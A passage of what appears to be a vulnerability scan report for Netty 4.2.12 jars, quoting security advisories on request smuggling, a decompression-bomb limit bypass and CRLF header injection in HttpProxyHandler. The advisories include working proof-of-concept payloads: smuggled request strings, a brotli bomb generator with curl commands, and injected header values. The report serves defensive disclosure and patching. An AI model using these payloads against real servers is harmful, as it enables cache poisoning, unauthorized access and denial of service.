+                        │      │                   POST /api HTTP/1.0\r\n
+                        │      │                   Host: internal.example.com\r\n
+                        │      │                   Transfer-Encoding: chunked\r\n
+                        │      │                   Content-Length: 0\r\n
+                        │      │                   \r\n
+                        │      │                   5\r\n
+                        │      │                   GPOST\r\n
+                        │      │                   0\r\n
+                        │      │                   Netty consumes the full chunked body (5 bytes + terminator).
+                        │      │                    A downstream CL-first proxy reads `Content-Length: 0`,
+                        │      │                   considers the request complete at the blank line, and treats
+                        │      │                    `5\r\nGPOST\r\n0\r\n\r\n` as the start of a second
+                        │      │                   request.
+                        │      │                   ## Conditions Required
+                        │      │                   1. Netty is deployed behind a reverse proxy or load balancer
+                        │      │                    that is `Content-Length`-first (nginx, some HAProxy
+                        │      │                   configs, AWS ALB in certain modes).
+                        │      │                   2. Attacker can send HTTP/1.0 requests (either directly or
+                        │      │                   by downgrading via connection manipulation).
+                        │      │                   3. No additional HTTP/1.0 stripping layer between attacker
+                        │      │                   and Netty.
+                        │      │                   ## Impact
+                        │      │                   Request smuggling at the Netty edge. Allows cache poisoning,
+                        │      │                    session fixation against other users, unauthorized access
+                        │      │                   to internal endpoints, and bypassing of WAF or
+                        │      │                   authentication layers that inspect only the first logical
+                        │      │                   ## Confirmed PoC Test
+                        │      │                   Verified against HEAD (`4f3533ae`) using `EmbeddedChannel`.
+                        │      │                   Both tests pass, confirming the vulnerability and the
+                        │      │                   HTTP/1.1 contrast.
+                        │      │                   package io.netty.handler.codec.http;
+                        │      │                   import io.netty.buffer.Unpooled;
+                        │      │                   import io.netty.channel.embedded.EmbeddedChannel;
+                        │      │                   import io.netty.util.CharsetUtil;
+                        │      │                   import org.junit.jupiter.api.Test;
+                        │      │                   import static org.junit.jupiter.api.Assertions.*;
+                        │      │                   public class NettySmugglingSec001Test {
+                        │      │                       // VULNERABLE: Content-Length survives in HTTP/1.0 TE+CL
+                        │      │                    conflict
+                        │      │                       @Test
+                        │      │                       public void http10_contentLengthNotStripped() {
+                        │      │                           EmbeddedChannel ch = new EmbeddedChannel(new
+                        │      │                   HttpRequestDecoder());
+                        │      │                           ch.writeInbound(Unpooled.copiedBuffer(
+                        │      │                                   "POST /api HTTP/1.0\r\n" +
+                        │      │                                   "Transfer-Encoding: chunked\r\n" +
+                        │      │                                   "Content-Length: 0\r\n" +
+                        │      │                                   "\r\n" +
+                        │      │                                   "5\r\nGPOST\r\n0\r\n\r\n",
+                        │      │                   CharsetUtil.US_ASCII));
+                        │      │                           HttpRequest req = ch.readInbound();
+                        │      │                           assertEquals(HttpVersion.HTTP_1_0,
+                        │      │                   req.protocolVersion());
+                        │      │                           // Content-Length: 0 survives — downstream CL-first
+                        │      │                   proxy treats chunked body as new request
+                        │      │                   assertNotNull(req.headers().get(HttpHeaderNames.CONTENT_LENG
+                        │      │                   TH), "VULNERABLE: CL not stripped");
+                        │      │                           ch.finishAndReleaseAll();
+                        │      │                       // SAFE: HTTP/1.1 correctly strips Content-Length on
+                        │      │                   TE+CL conflict
+                        │      │                       public void http11_contentLengthStripped() {
+                        │      │                                   "POST /api HTTP/1.1\r\n" +
+                        │      │                   assertNull(req.headers().get(HttpHeaderNames.CONTENT_LENGTH)
+                        │      │                   , "SAFE: CL correctly stripped");
+                        │      │                   ## Fix Guidance
+                        │      │                   Remove the `message.protocolVersion() ==
+                        │      │                   HttpVersion.HTTP_1_1` guard in `HttpObjectDecoder`, applying
+                        │      │                    `handleTransferEncodingChunkedWithContentLength`
+                        │      │                   unconditionally whenever both `Transfer-Encoding: chunked`
+                        │      │                   and `Content-Length` are present, regardless of protocol
+                        │      │                   version. 
+                        │      ├ Severity        : MEDIUM 
+                        │      ├ VendorSeverity   ─ ghsa: 2 
+                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:N 
+                        │      │                         ╰ V3Score : 5.8 
+                        │      ╰ References       ╭ [0]: https://github.com/netty/netty 
+                        │                         ╰ [1]: https://github.com/netty/netty/security/advisories/GHS
+                        │                                A-xxqh-mfjm-7mv9 
+                        ├ [7]  ╭ VulnerabilityID : CVE-2026-42585 
+                        │      ├ VendorIDs        ─ [0]: GHSA-38f8-5428-x5cv 
+                        │      ├ PkgName         : io.netty:netty-codec-http 
+                        │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.12.Final.jar 
+                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.12.Final 
+                        │      │                  ╰ UID : 42139b2b89dda2f4 
+                        │      ├ InstalledVersion: 4.2.12.Final 
+                        │      ├ FixedVersion    : 4.2.13.Final, 4.1.133.Final 
+                        │      ├ Status          : fixed 
+                        │      ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e
+                        │      │                  │         94edd8ebe468fc57d07e 
+                        │      │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2a
+                        │      │                            e0961a5292bd158a4dcf 
+                        │      ├ SeveritySource  : ghsa 
+                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42585 
+                        │      ├ DataSource       ╭ ID  : ghsa 
+                        │      │                  ├ Name: GitHub Security Advisory Maven 
+                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
+                        │      │                          cosystem%3Amaven 
+                        │      ├ Fingerprint     : sha256:7419c9f0809b4d7e52fd6bbce26d4f255f44b83b5136f21b64c63
+                        │      │                   ef1e5207783 
+                        │      ├ Title           : Netty vulnerable to HTTP Request Smuggling due to malformed
+                        │      │                   Transfer-Encoding 
+                        │      ├ Description     : ### Summary
+                        │      │                   Netty incorrectly parses malformed Transfer-Encoding,
+                        │      │                   enabling request smuggling attacks.
+                        │      │                   
+                        │      │                   ### Details
+                        │      │                   Netty incorrectly marks a request as chunked when malformed
+                        │      │                   "Transfer-Encoding: chunked, identity" is present.
+                        │      │                   According to RFC
+                        │      │                   https://datatracker.ietf.org/doc/html/rfc9112#name-message-b
+                        │      │                   ody-length
+                        │      │                   "
+                        │      │                   If a Transfer-Encoding header field is present in a request
+                        │      │                   and the chunked transfer coding is not the final encoding,
+                        │      │                    the message body length cannot be determined reliably; the
+                        │      │                   server MUST respond with the 400 (Bad Request)
+                        │      │                    status code and then close the connection.
+                        │      │                   A possible scenario is when Netty is behind a proxy that
+                        │      │                   doesn't reject requests with "Transfer-Encoding: chunked,
+                        │      │                   identity", but prefers "Content-Length" and forwards the
+                        │      │                   content to Netty.
+                        │      │                   ### PoC
+                        │      │                   The test below shows Netty successfully parsing the second
+                        │      │                   request, demonstrating how an attacker can smuggle a second
+                        │      │                   request inside a request body.
+                        │      │                   ```java
+                        │      │                   @Test
+                        │      │                       public void test() {
+                        │      │                           String requestStr = "POST / HTTP/1.1\r\n" +
+                        │      │                                   "Host: localhost\r\n" +
+                        │      │                                   "Transfer-Encoding: chunked, identity\r\n"
+                        │      │                   +
+                        │      │                                   "Content-Length: 48\r\n" +
+                        │      │                                   "\r\n" +
+                        │      │                                   "0\r\n" +
+                        │      │                                   "GET /smuggled HTTP/1.1\r\n" +
+                        │      │                                   "\r\n";
+                        │      │                           EmbeddedChannel channel = new EmbeddedChannel(new
+                        │      │                   HttpRequestDecoder());
+                        │      │                          
+                        │      │                   assertTrue(channel.writeInbound(Unpooled.copiedBuffer(reques
+                        │      │                   tStr, CharsetUtil.US_ASCII)));
+                        │      │                           // Request 1
+                        │      │                           HttpRequest request = channel.readInbound();
+                        │      │                           assertTrue(request.decoderResult().isSuccess());
+                        │      │                   assertTrue(request.headers().contains("Transfer-Encoding"));
+                        │      │                   assertFalse(request.headers().contains("Content-Length"));
+                        │      │                           LastHttpContent last = channel.readInbound();
+                        │      │                           assertTrue(last.decoderResult().isSuccess());
+                        │      │                           last.release();
+                        │      │                           // Request 2
+                        │      │                           request = channel.readInbound();
+                        │      │                           last = channel.readInbound();
+                        │      │                       }
+                        │      │                   ```
+                        │      │                   ### Impact
+                        │      │                   HTTP Request Smuggling: Attacker injects arbitrary HTTP
+                        │      │                   requests 
+                        │      ├ Severity        : MEDIUM 
+                        │      ├ VendorSeverity   ─ ghsa: 2 
+                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N 
+                        │      │                         ╰ V3Score : 6.5 
+                        │      ╰ References       ╭ [0]: https://datatracker.ietf.org/doc/html/rfc9112#name-mes
+                        │                         │      sage-body-length 
+                        │                         ├ [1]: https://github.com/netty/netty 
+                        │                         ╰ [2]: https://github.com/netty/netty/security/advisories/GHS
+                        │                                A-38f8-5428-x5cv 
+                        ├ [8]  ╭ VulnerabilityID : CVE-2026-42587 
+                        │      ├ VendorIDs        ─ [0]: GHSA-f6hv-jmp6-3vwv 
+                        │      ├ PkgName         : io.netty:netty-codec-http2 
+                        │      ├ PkgPath         : openaf/Kube/netty-codec-http2-4.2.12.Final.jar 
+                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http2@4.2.12.Final 
+                        │      │                  ╰ UID : c9374114bd085c75 
+                        │      ├ InstalledVersion: 4.2.12.Final 
+                        │      ├ FixedVersion    : 4.2.13.Final, 4.1.133.Final 
+                        │      ├ Status          : fixed 
+                        │      ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e
+                        │      │                  │         94edd8ebe468fc57d07e 
+                        │      │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2a
+                        │      │                            e0961a5292bd158a4dcf 
+                        │      ├ SeveritySource  : ghsa 
+                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42587 
+                        │      ├ DataSource       ╭ ID  : ghsa 
+                        │      │                  ├ Name: GitHub Security Advisory Maven 
+                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
+                        │      │                          cosystem%3Amaven 
+                        │      ├ Fingerprint     : sha256:ef9815ae7a94903bd25f8c10fe8311c41be84c2034ee55de81513
+                        │      │                   911ed991da4 
+                        │      ├ Title           : Netty: HttpContentDecompressor maxAllocation bypass when
+                        │      │                   Content-Encoding set to br/zstd/snappy leads to
+                        │      │                   decompression bomb DoS 
+                        │      ├ Description     : ## Summary
+                        │      │                   
+                        │      │                   `HttpContentDecompressor` accepts a `maxAllocation`
+                        │      │                   parameter to limit decompression buffer size and prevent
+                        │      │                   decompression bomb attacks. This limit is correctly enforced
+                        │      │                    for gzip and deflate encodings via `ZlibDecoder`, but is
+                        │      │                   silently ignored when the content encoding is `br` (Brotli),
+                        │      │                    `zstd`, or `snappy`. An attacker can bypass the configured
+                        │      │                   decompression limit by sending a compressed payload with
+                        │      │                   `Content-Encoding: br` instead of `Content-Encoding: gzip`,
+                        │      │                   causing unbounded memory allocation and out-of-memory denial
+                        │      │                    of service.
+                        │      │                   The same vulnerability exists in
+                        │      │                   `DelegatingDecompressorFrameListener` for HTTP/2
+                        │      │                   connections.
+                        │      │                   ## Details
+                        │      │                   `HttpContentDecompressor` stores the `maxAllocation` value
+                        │      │                   at construction time (`HttpContentDecompressor.java:89`) and
+                        │      │                    uses it in `newContentDecoder()` to create the appropriate
+                        │      │                   decompression handler.
+                        │      │                   For gzip/deflate, `maxAllocation` is forwarded to
+                        │      │                   `ZlibCodecFactory.newZlibDecoder()`:
+                        │      │                   ```java
+                        │      │                   // HttpContentDecompressor.java:101 — maxAllocation IS
+                        │      │                   enforced
+                        │      │                   .handlers(ZlibCodecFactory.newZlibDecoder(ZlibWrapper.GZIP,
+                        │      │                   maxAllocation))
+                        │      │                   ```
+                        │      │                   `ZlibDecoder.prepareDecompressBuffer()` enforces this as a
+                        │      │                   hard cap by setting the buffer's `maxCapacity` and throwing
+                        │      │                   `DecompressionException` when the limit is reached:
+                        │      │                   // ZlibDecoder.java:68 — hard limit on buffer capacity
+                        │      │                   return ctx.alloc().heapBuffer(Math.min(preferredSize,
+                        │      │                   maxAllocation), maxAllocation);
+                        │      │                   // ZlibDecoder.java:80 — throws when exceeded
+                        │      │                   throw new DecompressionException("Decompression buffer has
+                        │      │                   reached maximum size: " + buffer.maxCapacity());
+                        │      │                   For brotli, zstd, and snappy, the decoders are created
+                        │      │                   without any size limit:
+                        │      │                   // HttpContentDecompressor.java:120 — maxAllocation IGNORED
+                        │      │                   .handlers(new BrotliDecoder())
+                        │      │                   // HttpContentDecompressor.java:129 — maxAllocation IGNORED
+                        │      │                   .handlers(new SnappyFrameDecoder())
+                        │      │                   // HttpContentDecompressor.java:138 — maxAllocation IGNORED
+                        │      │                   .handlers(new ZstdDecoder())
+                        │      │                   `BrotliDecoder` has no `maxAllocation` parameter at all —
+                        │      │                   there is no way to constrain its output. It streams
+                        │      │                   decompressed data in chunks via `fireChannelRead` with no
+                        │      │                   total limit.
+                        │      │                   `ZstdDecoder()` defaults to a 4MB `maximumAllocationSize`,
+                        │      │                   but this only constrains individual buffer allocations, not
+                        │      │                   total output. The decode loop (`ZstdDecoder.java:100-114`)
+                        │      │                   creates new buffers and fires `channelRead` repeatedly, so
+                        │      │                   total decompressed output is unbounded.
+                        │      │                   The identical pattern exists in
+                        │      │                   `DelegatingDecompressorFrameListener.newContentDecompressor(
+                        │      │                   )` at lines 188-210 for HTTP/2.
+                        │      │                   ## PoC
+                        │      │                   1. Configure a Netty HTTP server with decompression bomb
+                        │      │                   protection:
+                        │      │                   pipeline.addLast(new HttpContentDecompressor(1048576)); //
+                        │      │                   1MB max
+                        │      │                   pipeline.addLast(new HttpObjectAggregator(1048576));     //
+                        │      │                   2. Generate a brotli-compressed bomb (~1KB compressed → 1GB
+                        │      │                   decompressed):
+                        │      │                   ```python
+                        │      │                   import brotli
+                        │      │                   bomb = b'\x00' * (1024 * 1024 * 1024)  # 1GB of zeros
+                        │      │                   compressed = brotli.compress(bomb, quality=11)
+                        │      │                   with open('bomb.br', 'wb') as f:
+                        │      │                       f.write(compressed)
+                        │      │                   # compressed size: ~1KB
+                        │      │                   3. Send the bomb with gzip encoding (BLOCKED by
+                        │      │                   maxAllocation):
+                        │      │                   ```bash
+                        │      │                   # This is caught — ZlibDecoder enforces the 1MB limit
+                        │      │                   curl -X POST http://target:8080/api \
+                        │      │                     -H 'Content-Encoding: gzip' \
+                        │      │                     --data-binary @bomb.gz
+                        │      │                   # Result: DecompressionException thrown at 1MB
+                        │      │                   4. Send the same bomb with brotli encoding (BYPASSES
+                        │      │                   # This bypasses the limit — BrotliDecoder has no
+                        │      │                   maxAllocation
+                        │      │                     -H 'Content-Encoding: br' \
+                        │      │                     --data-binary @bomb.br
+                        │      │                   # Result: Full 1GB decompressed into memory → OOM
+                        │      │                   5. The same bypass works with `Content-Encoding: zstd` and
+                        │      │                   `Content-Encoding: snappy`.
+                        │      │                   ## Impact
+                        │      │                   - **Denial of Service**: An attacker can cause out-of-memory
+                        │      │                    conditions on any Netty server that relies on
+                        │      │                   `maxAllocation` for decompression bomb protection, by simply
+                        │      │                    using a non-gzip content encoding.
+                        │      │                   - **False sense of security**: Developers who explicitly
+                        │      │                   configure `maxAllocation` to protect against decompression
+                        │      │                   bombs are not actually protected for brotli, zstd, or snappy
+                        │      │                    encodings. The API documentation implies all encodings are
+                        │      │                   covered.
+                        │      │                   - **Trivial bypass**: The attacker only needs to change one
+                        │      │                   HTTP header (`Content-Encoding: br` instead of
+                        │      │                   `Content-Encoding: gzip`) to circumvent the protection
+                        │      │                   entirely.
+                        │      │                   - **Both HTTP/1.1 and HTTP/2**: The vulnerability exists in
+                        │      │                   both `HttpContentDecompressor` (HTTP/1.1) and
+                        │      │                   `DelegatingDecompressorFrameListener` (HTTP/2).
+                        │      │                   ## Recommended Fix
+                        │      │                   Pass `maxAllocation` to all decoder constructors. For
+                        │      │                   `BrotliDecoder`, which currently has no `maxAllocation`
+                        │      │                   support, add the parameter:
+                        │      │                   **HttpContentDecompressor.java** — pass maxAllocation to all
+                        │      │                    decoders:
+                        │      │                   // Line 120: BrotliDecoder — add maxAllocation support
+                        │      │                   .handlers(new BrotliDecoder(maxAllocation))
+                        │      │                   // Line 129: SnappyFrameDecoder — add maxAllocation support
+                        │      │                   .handlers(new SnappyFrameDecoder(maxAllocation))
+                        │      │                   // Line 138: ZstdDecoder — forward the configured
+                        │      │                   .handlers(new ZstdDecoder(maxAllocation))
+                        │      │                   **DelegatingDecompressorFrameListener.java** — same fix at
+                        │      │                   lines 188-210.
+                        │      │                   **BrotliDecoder** — add `maxAllocation` parameter with the
+                        │      │                   same semantics as `ZlibDecoder.prepareDecompressBuffer()`:
+                        │      │                   set buffer maxCapacity and throw `DecompressionException`
+                        │      │                   when the total decompressed output exceeds the limit.
+                        │      │                   **SnappyFrameDecoder** — add `maxAllocation` parameter with
+                        │      │                   equivalent enforcement.
+                        │      │                   **ZstdDecoder** — ensure that when `maxAllocation` is set,
+                        │      │                   total output across all buffers is bounded (not just
+                        │      │                   per-buffer allocation size). 
+                        │      ├ Severity        : HIGH 
+                        │      ├ VendorSeverity   ─ ghsa: 3 
+                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
+                        │      │                         ╰ V3Score : 7.5 
+                        │      ╰ References       ╭ [0]: https://github.com/netty/netty 
+                        │                         ╰ [1]: https://github.com/netty/netty/security/advisories/GHS
+                        │                                A-f6hv-jmp6-3vwv 
+                        ├ [9]  ╭ VulnerabilityID : CVE-2026-42578 
+                        │      ├ VendorIDs        ─ [0]: GHSA-45q3-82m4-75jr 
+                        │      ├ PkgName         : io.netty:netty-handler-proxy 
+                        │      ├ PkgPath         : openaf/Kube/netty-handler-proxy-4.2.12.Final.jar 
+                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-handler-proxy@4.2.12.Final 
+                        │      │                  ╰ UID : 8344d1e8c7524c10 
+                        │      ├ InstalledVersion: 4.2.12.Final 
+                        │      ├ FixedVersion    : 4.1.133.Final, 4.2.13.Final 
+                        │      ├ Status          : fixed 
+                        │      ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e
+                        │      │                  │         94edd8ebe468fc57d07e 
+                        │      │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2a
+                        │      │                            e0961a5292bd158a4dcf 
+                        │      ├ SeveritySource  : ghsa 
+                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42578 
+                        │      ├ DataSource       ╭ ID  : ghsa 
+                        │      │                  ├ Name: GitHub Security Advisory Maven 
+                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
+                        │      │                          cosystem%3Amaven 
+                        │      ├ Fingerprint     : sha256:abd51ae1d37b71a2b0d1e0382a01595512c746d45ef85bfe84b3a
+                        │      │                   488cbcb55da 
+                        │      ├ Title           : Netty has HTTP Header Injection via HttpProxyHandler
+                        │      │                   Disabled Validation (Incomplete Fix CVE-2025-67735) 
+                        │      ├ Description     : # Security Vulnerability Report: HTTP Header Injection via
+                        │      │                   HttpProxyHandler Disabled Validation in Netty
+                        │      │                   
+                        │      │                   ## 1. Vulnerability Summary
+                        │      │                   | Field | Value |
+                        │      │                   |-------|-------|
+                        │      │                   | **Product** | Netty |
+                        │      │                   | **Version** | 4.2.12.Final (and all prior versions) |
+                        │      │                   | **Component** | `io.netty.handler.proxy.HttpProxyHandler`
+                        │      │                   |
+                        │      │                   | **Vulnerability Type** | CWE-113: Improper Neutralization
+                        │      │                   of CRLF Sequences in HTTP Headers |
+                        │      │                   | **Impact** | HTTP Header Injection in CONNECT Proxy
+                        │      │                   Requests |
+                        │      │                   | **CVSS 3.1 Score** | **7.5 (High)** |
+                        │      │                   | **CVSS 3.1 Vector** |
+                        │      │                   `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` |
+                        │      │                   | **Related Advisory** | **GHSA-84h7-rjj3-6jx4** (Incomplete
+                        │      │                    Fix) |
+                        │      │                   ## 2. Affected Components
+                        │      │                   - `io.netty.handler.proxy.HttpProxyHandler` —
+                        │      │                   `newInitialMessage()` method (line 176) explicitly disables
+                        │      │                   header validation via `withValidation(false)`
+                        │      │                   ## 3. Vulnerability Description
+                        │      │                   Netty's `HttpProxyHandler` constructs HTTP CONNECT requests
+                        │      │                   with **header validation explicitly disabled**. The
+                        │      │                   `newInitialMessage()` method (line 176) creates headers
+                        │      │                   using
+                        │      │                   `DefaultHttpHeadersFactory.headersFactory().withValidation(f
+                        │      │                   alse)`, then adds user-provided `outboundHeaders` (line
+                        │      │                   188-190) without any CRLF validation. This allows an
+                        │      │                   attacker who can influence the outbound headers to inject
+                        │      │                   arbitrary HTTP headers into the CONNECT request sent to the
+                        │      │                   proxy server.
+                        │      │                   ### Root Cause
+                        │      │                   ```java
+                        │      │                   // HttpProxyHandler.java:176-190
+                        │      │                   protected Object newInitialMessage(ChannelHandlerContext
+                        │      │                   ctx) throws Exception {
+                        │      │                       // ...
+                        │      │                       HttpHeadersFactory headersFactory =
+                        │      │                   DefaultHttpHeadersFactory.headersFactory()
+                        │      │                           .withValidation(false);  // <-- VALIDATION
+                        │      │                   EXPLICITLY DISABLED
+                        │      │                       FullHttpRequest req = new DefaultFullHttpRequest(
+                        │      │                           HttpVersion.HTTP_1_1, HttpMethod.CONNECT,
+                        │      │                           url, Unpooled.EMPTY_BUFFER, headersFactory,
+                        │      │                   headersFactory);
+                        │      │                       req.headers().set(HttpHeaderNames.HOST, hostHeader);
+                        │      │                       if (authorization != null) {
+                        │      │                          
+                        │      │                   req.headers().set(HttpHeaderNames.PROXY_AUTHORIZATION,
+                        │      │                   authorization);
+                        │      │                       }
+                        │      │                       if (outboundHeaders != null) {
+                        │      │                           req.headers().add(outboundHeaders);  // <-- USER
+                        │      │                   HEADERS ADDED WITHOUT VALIDATION
+                        │      │                       return req;
+                        │      │                   }
+                        │      │                   ```
+                        │      │                   The `outboundHeaders` parameter comes from the
+                        │      │                   `HttpProxyHandler` constructor (lines 80-93, 99-127), which
+                        │      │                   is supplied by application code.
+                        │      │                   ### Incomplete Fix of GHSA-84h7-rjj3-6jx4
+                        │      │                   **This vulnerability represents an incomplete fix of the
+                        │      │                   previously acknowledged security advisory
+                        │      │                   [GHSA-84h7-rjj3-6jx4](https://github.com/netty/netty/securit
+                        │      │                   y/advisories/GHSA-84h7-rjj3-6jx4).**
+                        │      │                   The GHSA-84h7-rjj3-6jx4 fix addressed HTTP CRLF injection by
+                        │      │                    adding URI validation via `validateRequestLineTokens()` in
+                        │      │                   `DefaultHttpRequest` and enabling header validation by
+                        │      │                   default through `DefaultHttpHeadersFactory`. However,
+                        │      │                   `HttpProxyHandler` **explicitly opts out** of the fix by
+                        │      │                   calling `withValidation(false)`, creating a gap where:
+                        │      │                   1. The GHSA-84h7-rjj3-6jx4 fix's header validation is
+                        │      │                   bypassed
+                        │      │                   2. User-provided `outboundHeaders` are added without any
+                        │      │                   CRLF check
+                        │      │                   3. The resulting CONNECT request contains unvalidated
+                        │      │                   headers on the wire
+                        │      │                   This is not a new vulnerability class — it is the **same
+                        │      │                   CRLF injection** that GHSA-84h7-rjj3-6jx4 was supposed to
+                        │      │                   fix, but `HttpProxyHandler` was missed during the
+                        │      │                   remediation. The fix for GHSA-84h7-rjj3-6jx4 should be
+                        │      │                   extended to cover this code path.
+                        │      │                   ## 4. Exploitability Prerequisites
+                        │      │                   This vulnerability is exploitable when:
+                        │      │                   1. An application uses `HttpProxyHandler` with
+                        │      │                   user-influenced `outboundHeaders`
+                        │      │                   2. The application does not perform its own CRLF
+                        │      │                   sanitization on header values
+                        │      │                   **Common affected patterns**:
+                        │      │                   - HTTP proxy clients that forward user-specified custom
+                        │      │                   headers
+                        │      │                   - Web scraping frameworks that allow users to set proxy
+                        │      │                   - API gateways that pass user headers through a proxy
+                        │      │                   tunnel
+                        │      │                   ## 5. Attack Scenarios
+                        │      │                   ### Scenario 1: Proxy Authentication Bypass
+                        │      │                   HttpHeaders headers = new DefaultHttpHeaders(false);
+                        │      │                   headers.set("X-Forwarded-For", userInput);  // userInput
+                        │      │                   from attacker
+                        │      │                   new HttpProxyHandler(proxyAddr, headers);
+                        │      │                   **Attack input**: `userInput =
+                        │      │                   "1.2.3.4\r\nProxy-Authorization: Basic YWRtaW46YWRtaW4="`
+                        │      │                   **Wire format**:
+                        │      │                   CONNECT target.com:443 HTTP/1.1
+                        │      │                   host: target.com:443
+                        │      │                   X-Forwarded-For: 1.2.3.4
+                        │      │                   Proxy-Authorization: Basic YWRtaW46YWRtaW4=    <-- INJECTED
+                        │      │                   The injected `Proxy-Authorization` header may override or
+                        │      │                   supplement the original authentication, potentially granting
+                        │      │                    access to a restricted proxy.
+                        │      │                   ### Scenario 2: Request Smuggling via Proxy
+                        │      │                   **Attack input**: `userInput = "value\r\nTransfer-Encoding:
+                        │      │                   chunked\r\n\r\n0\r\n\r\nGET /internal HTTP/1.1\r\nHost:
+                        │      │                   internal-service"`
+                        │      │                   Injects a full smuggled request through the proxy tunnel
+                        │      │                   establishment.
+                        │      │                   ## 6. Proof of Concept
+                        │      │                   ### Full Runnable PoC Source Code
+                        │      │                   (HttpProxyHeaderInjectionPoC.java)
+                        │      │                   import io.netty.buffer.ByteBuf;
+                        │      │                   import io.netty.channel.embedded.EmbeddedChannel;
+                        │      │                   import io.netty.handler.codec.http.*;
+                        │      │                   import java.nio.charset.StandardCharsets;
+                        │      │                   public class HttpProxyHeaderInjectionPoC {
+                        │      │                       public static void main(String[] args) {
+                        │      │                           System.out.println("=== Netty HttpProxyHandler
+                        │      │                   Header Injection PoC ===\n");
+                        │      │                           // Simulate HttpProxyHandler.newInitialMessage()
+                        │      │                   with validation=false
+                        │      │                           HttpHeadersFactory headersFactory =
+                        │      │                               .withValidation(false);
+                        │      │                           FullHttpRequest req = new DefaultFullHttpRequest(
+                        │      │                               HttpVersion.HTTP_1_1, HttpMethod.CONNECT,
+                        │      │                               "target.com:443",
+                        │      │                               io.netty.buffer.Unpooled.EMPTY_BUFFER,
+                        │      │                   headersFactory, headersFactory);
+                        │      │                           req.headers().set(HttpHeaderNames.HOST,
+                        │      │                   "target.com:443");
+                        │      │                           // Inject CRLF in header value
+                        │      │                           String malicious = "1.2.3.4\r\nX-Forwarded-For:
+                        │      │                   127.0.0.1\r\nX-Admin: true";
+                        │      │                           req.headers().set("X-Forwarded-For", malicious);
+                        │      │                           // Encode to wire format
+                        │      │                           EmbeddedChannel ch = new EmbeddedChannel(new
+                        │      │                   HttpRequestEncoder());
+                        │      │                           ch.writeOutbound(req);
+                        │      │                           ByteBuf out = ch.readOutbound();
+                        │      │                           String encoded =
+                        │      │                   out.toString(StandardCharsets.UTF_8);
+                        │      │                           out.release();
+                        │      │                           ch.finishAndReleaseAll();
+                        │      │                           System.out.println("Wire format:");
+                        │      │                           for (String line : encoded.split("\n", -1)) {
+                        │      │                               System.out.println("  " + line.replace("\r",
+                        │      │                   "\\r"));
+                        │      │                           }
+                        │      │                           System.out.println("Injected X-Admin: " +
+                        │      │                   encoded.contains("X-Admin: true"));
+                        │      │                           System.out.println("VULNERABLE: " +
+                        │      │                               (encoded.contains("X-Admin: true") ? "YES" :
+                        │      │                   "NO"));
+                        │      │                   ### PoC Execution Output (Verified on Netty 4.2.12.Final)
+                        │      │                   === Netty HttpProxyHandler Header Injection PoC ===
+                        │      │                   [TEST 1] outboundHeaders with CRLF (validation disabled)
+                        │      │                   ----------------------------------------------------------
+                        │      │                     Injected header value: "1.2.3.4\r\nX-Forwarded-For:
+                        │      │                   127.0.0.1\r\nX-Admin: true"
+                        │      │                     Header accepted: YES (validation disabled!)
+                        │      │                     Wire format:
+                        │      │                       CONNECT target.com:443 HTTP/1.1\r
+                        │      │                       host: target.com:443\r
+                        │      │                       X-Forwarded-For: 1.2.3.4\r
+                        │      │                       X-Forwarded-For: 127.0.0.1\r          <-- INJECTED
+                        │      │                       X-Admin: true\r                        <-- INJECTED
+                        │      │                       \r
+                        │      │                     Injected X-Admin header in wire: true
+                        │      │                     VULNERABLE: YES
+                        │      │                   [TEST 2] validation=true vs validation=false comparison
+                        │      │                   --------------------------------------------------------
+                        │      │                     With validation=true:
+                        │      │                       SAFE: Rejected - IllegalArgumentException
+                        │      │                     With validation=false:
+                        │      │                       VULNERABLE: Accepted CRLF in header value!
+                        │      │                       Stored value contains CRLF: true
+                        │      │                   ## 7. Remediation Recommendations
+                        │      │                   ### Option 1: Remove withValidation(false)
+                        │      │                   // Change HttpProxyHandler.java line 176 from:
+                        │      │                   HttpHeadersFactory headersFactory =
+                        │      │                   DefaultHttpHeadersFactory.headersFactory().withValidation(fa
+                        │      │                   lse);
+                        │      │                   // To:
+                        │      │                   DefaultHttpHeadersFactory.headersFactory();
+                        │      │                   ### Option 2: Validate outboundHeaders Before Adding
+                        │      │                   if (outboundHeaders != null) {
+                        │      │                       for (Map.Entry<String, String> entry : outboundHeaders)
+                        │      │                   {
+                        │      │                           HttpUtil.validateHeaderValue(entry.getValue());
+                        │      │                       req.headers().add(outboundHeaders);
+                        │      │                   ## 8. Resources
+                        │      │                   - [GHSA-84h7-rjj3-6jx4: Netty HTTP CRLF Injection
+                        │      │                   (**incomplete fix — this
+                        │      │                   report**)](https://github.com/netty/netty/security/advisorie
+                        │      │                   s/GHSA-84h7-rjj3-6jx4)
+                        │      │                   - [CWE-113: Improper Neutralization of CRLF Sequences in
+                        │      │                   HTTP
+                        │      │                   Headers](https://cwe.mitre.org/data/definitions/113.html) 
+                        │      ├ Severity        : LOW 
+                        │      ├ VendorSeverity   ─ ghsa: 1 
